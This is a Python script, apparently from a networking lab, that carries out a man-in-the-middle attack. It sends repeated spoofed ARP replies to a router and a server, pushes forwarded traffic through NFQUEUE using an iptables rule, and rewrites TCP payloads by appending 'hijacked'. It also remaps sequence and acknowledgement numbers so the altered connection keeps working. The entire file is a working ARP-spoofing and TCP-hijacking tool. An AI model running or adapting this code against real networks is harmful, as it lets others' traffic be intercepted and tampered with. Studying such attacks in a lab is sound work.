# https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
# https://www.youtube.com/watch?v=4IMc3CaMhyY&list=PLowKtXNTBypH19whXTVoG3oKSuOcw_XeW&index=13 
# https://medium.com/@R00tendo/modifying-packets-on-the-fly-python-76076c5d6e1e
# https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
# https://medium.com/@R00tendo/tcp-connection-hijacking-deep-dive-9bbe03fce9a9
# https://networklessons.com/cisco/ccie-routing-switching-written/tcp-header
# https://networks.hypha.ro/capitolul6/#scapy_nfqueue
# https://www.youtube.com/watch?v=8XJPZttC4RM&t=1s 
# https://www.youtube.com/watch?v=F27PLin3TV0 
# https://www.youtube.com/watch?v=k-0GLQV753I 
# https://www.youtube.com/watch?v=ahYgoV8MDtg

from scapy.all import ARP, send, conf, getmacbyip, IP, TCP, Raw
from netfilterqueue import NetfilterQueue as NFQ
from threading import Thread
from time import sleep
import os

conf.verb = 0 
conf.iface = "eth0"

router_address = ("198.7.0.1", getmacbyip("198.7.0.1"))
server_address = ("198.7.0.2", getmacbyip("198.7.0.2"))

router, r_router = {}, {}
server, r_server = {}, {}

QUEUE_NUM = 1
MESSAGE = "hijacked"
TCP_FLAGS = {
    "FIN": 0x01,
    "SYN": 0x02,
    "PSH": 0x08,
    "ACK": 0x10
}

def arp_poison(gateway, target):
    print("Started ARP spoofing attack")
    
    gateway_ip, gateway_mac = gateway
    target_ip, target_mac = target
    
    try: 
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            sleep(1)
    except KeyboardInterrupt:
        print("Stopped ARP spoofing attack")

def alter_packet(packet):
    src, dst = packet[IP].src, packet[IP].dst
    if src not in [server_address[0], router_address[0]]:
        return packet
    
    payload, altered_payload = b"", b""
    if packet.haslayer(Raw):
        payload = packet[Raw].load
        altered_payload = payload + (" " + MESSAGE).encode("utf-8")
    
    seq, ack = packet[TCP].seq, packet[TCP].ack
    if src == server_address[0]:
        altered_packet_seq = r_server.get(seq, seq)
        altered_packet_ack = router.get(ack, ack)
    else:
        altered_packet_seq = r_router.get(seq, seq)
        altered_packet_ack = server.get(ack, ack)
    
    real_ack   = (seq + len(payload)) % ((1 << 32) - 1)
    hacked_ack = (altered_packet_seq + len(altered_payload)) % ((1 << 32) - 1)
    
    if src == server_address[0]:
        server[hacked_ack] = real_ack        
        r_server[real_ack] = hacked_ack
    else: 
        router[hacked_ack] = real_ack
        r_router[real_ack] = hacked_ack
        
    return IP(
            src=src, 
            dst=dst,
        ) / TCP(
            sport=packet[TCP].sport,
            dport=packet[TCP].dport,
            seq=altered_packet_seq,
            ack=altered_packet_ack,
            flags=packet[TCP].flags
        ) / Raw(altered_payload)

def process_packet(packet):
    altered_packet = IP(packet.get_payload())
    
    if altered_packet.haslayer(IP) and \
        altered_packet.haslayer(TCP) and \
            altered_packet[TCP].flags & (TCP_FLAGS["ACK"] | TCP_FLAGS["PSH"]):
                altered_packet = alter_packet(altered_packet)
    
    packet.drop()
    send(altered_packet)    

try: 
    print("Updating IPTABLES firewall rules") 
    os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")

    poison_thread = Thread(target=arp_poison, args=(router_address, server_address))
    poison_thread.start()

    sleep(3) 
   
    queue = NFQ()
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")
    queue.unbind()